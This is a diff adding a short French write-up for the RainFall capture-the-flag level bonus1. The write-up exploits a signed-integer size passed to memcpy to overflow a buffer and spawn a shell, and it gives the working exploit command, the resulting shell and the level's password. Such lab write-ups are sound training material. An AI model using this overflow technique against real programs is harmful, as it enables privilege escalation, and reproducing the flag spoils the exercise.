@@ -1,0 +1,16 @@
+Ici on a un programme qui recoit deux parametre et les utilise pour faire des verification qui, si elles sont justes, execute bin sh.
+Seulement, il n'est pas possible, sans corrompre la memoire, d'acceder a ce bin sh.
+Et afin de se faire, il suffit de dire a memcpy de copier plus de caracteres que le programme initial ne lui demande, en se servant de la partie signe d'un int comme parametre size.
+
+bonus1@RainFall:~$ ltrace ./bonus1 -2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+__libc_start_main(0x8048424, 3, 0xbffff764, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0xbffff8a6, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = -2
+memcpy(0xbffff694, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 4294967288 <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+bonus1@RainFall:~$ ./bonus1 -2147483630 $(python -c 'print("a" * 40 + "\x46\x4c\x4f\x57")')
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
